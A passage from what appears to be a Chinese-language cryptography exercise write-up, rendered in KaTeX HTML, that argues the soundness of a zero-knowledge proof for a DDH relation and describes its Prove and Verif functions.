mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>同时对两个不同的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>都能应答<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub><mn>1</mn><mo separator="true">,</mo><msub><mi>z</mi><mn>1</mn></msub><mn>2</mn><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mn>1</mn><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mn>2</mn></mrow><annotation encoding="application/x-tex">z_11,z_12,z_21,z_22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">2</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>=</mo><mfrac><mrow><msub><mi>z</mi><mn>11</mn></msub><mo>−</mo><msub><mi>z</mi><mn>12</mn></msub></mrow><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>−</mo><msub><mi>s</mi><mn>2</mn></msub></mrow></mfrac><mo>=</mo><mfrac><mrow><msub><mi>z</mi><mn>21</mn></msub><mo>−</mo><msub><mi>z</mi><mn>22</mn></msub></mrow><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>−</mo><msub><mi>s</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">r=\frac{z_{11}-z_{12}}{s_1-s_2}=\frac{z_{21}-z_{22}}{s_1-s_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.263531em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8184309999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.263531em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8184309999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_1,s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>都是Bob随机选取的，于是Alice就需要以猜测穷举离散对数的空间复杂度获得满足条件的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span></span></span>。因此，如果Alice能够通过验证，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>一定是一个DDH关系。</p>
<h2 id="问题5"><a class="markdownIt-Anchor" href="#问题5"></a> 问题5</h2>
<p>  在Prove函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><msup><mi>f</mi><msub><mi>k</mi><mn>1</mn></msub></msup><mo separator="true">,</mo><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><msup><mi>g</mi><msub><mi>k</mi><mn>2</mn></msub></msup></mrow><annotation encoding="application/x-tex">f&#x27;=f^{k_1},g&#x27;=g^{k_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub><mo>=</mo><mi>s</mi><mo>+</mo><mi>r</mi><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mo>=</mo><mi>s</mi><mo>+</mo><mi>r</mi><msub><mi>k</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">z_1=s+rk_1,z_2=s+rk_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，最后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msub><mi>z</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">f&#x27;,g&#x27;,z_1,z_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。在Verif函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><msub><mi>z</mi><mn>1</mn></msub></msup></mrow><annotation encoding="application/x-tex">f^{z_1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mi>s</mi></msup><mo>+</mo><mi>F</mi><mo>∗</mo><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">f^s+F*f&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><msub><mi>z</mi><mn>2</mn></msub></msup></mrow><annotation encoding="application/x-tex">g^{z_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>s</mi></msup><mo>+</mo><mi>G</mi><mo>∗</mo><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">g^s+G*g&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" 